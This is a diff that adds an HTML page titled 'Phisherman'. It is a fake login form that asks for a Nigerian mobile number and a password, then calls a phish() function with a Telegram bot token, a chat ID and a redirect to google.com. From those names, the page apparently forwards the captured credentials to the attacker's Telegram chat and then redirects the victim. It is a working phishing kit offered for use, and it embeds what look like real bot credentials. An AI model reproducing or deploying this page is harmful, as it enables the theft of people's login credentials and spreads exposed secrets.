@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phisherman</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div>
+        <img class="back-nav" src="https://www.iconspng.com/uploads/arrow-grey-simple-right.png">
+    </div>
+    <div class="close-nav">&#10006;</div>
+
+    <center>
+        <h1>Login</h1>
+    </center>
+    <center><input type="text" id='username' placeholder="+234 Mobile Number">
+        <br>
+        <input type="password" id='password' placeholder="Password">
+        <br>
+        <a href="#">Forgot Password?</a>
+        <br>
+        <button type="button" id="submit-button">Login</button>
+    </center>
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>
+    <script src="phish.js"></script>
+    <script>
+        $(document).ready(function() {
+            const BOT_TOKEN = '5313824526:AAEI3MgZNSxfGmExZCB8srsgh_4c_gC6sDc',
+                CHAT_ID = '2040461515',
+                REDIRECT_URL = 'https://google.com'
+            phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
+        });
+
+    </script>
+</body>
+
+</html>
